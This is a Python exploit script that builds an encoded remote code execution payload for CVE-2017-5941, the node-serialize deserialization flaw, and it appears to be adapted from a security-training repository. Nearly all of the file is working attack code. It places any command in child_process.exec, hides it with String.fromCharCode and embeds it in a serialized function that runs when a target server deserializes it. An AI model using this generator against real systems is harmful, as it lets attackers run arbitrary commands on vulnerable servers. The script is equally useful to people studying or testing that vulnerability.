#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Based on:            https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py
Target URL example:  http://<RHOST>:<RPORT>
"""


def gen_payload(cmd):
	"""CVE-2017-5941."""
	payload = _build_exec_command(cmd)
	payload = _encode_string(payload)
	payload = '{"run":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % payload

	return payload


def _build_exec_command(cmd):
	return '''\
        require('child_process').exec('%s', function(error, stdout, stderr) {
            console.log(error)
            console.log(stdout)
        })''' % cmd


def _encode_string(string):
	string_encoded = ''
	for char in string:
		string_encoded += ',' + str(ord(char))

	return string_encoded[1:]
